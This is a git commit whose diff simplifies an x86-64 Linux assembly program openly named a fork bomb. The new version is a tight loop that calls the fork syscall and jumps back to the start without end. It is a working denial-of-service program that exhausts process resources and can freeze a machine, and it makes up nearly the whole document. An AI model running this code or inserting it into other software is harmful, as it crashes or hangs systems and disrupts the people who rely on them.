cced5fb166608b8f2a8b739c8c0024b03f410ec4
Bram <warsocket@gmail.com>
2018-02-25 13:17:08 +0100

    simplified forkbomb

--- forkbomb.asm
+++ forkbomb.asm
@@ -1,33 +1,8 @@
-section .data
-
-s dq 0
-ns dq 500000000
-
-
 section .text
 
 global _start
 _start:
-
 	;fork
 	mov rax, 57
 	syscall	
-	test rax, rax
-	jz fork
-
-	;nanosleep
-	mov rax, 35
-	mov rdi, s
-	xor rsi, rsi
-	syscall
-
-	;exit
-	mov rax, 60
-	xor rdi, rdi
-	syscall
-
-	fork:
-	;fork
-	mov rax, 57
-	syscall	
-	jmp fork
+	jmp _start
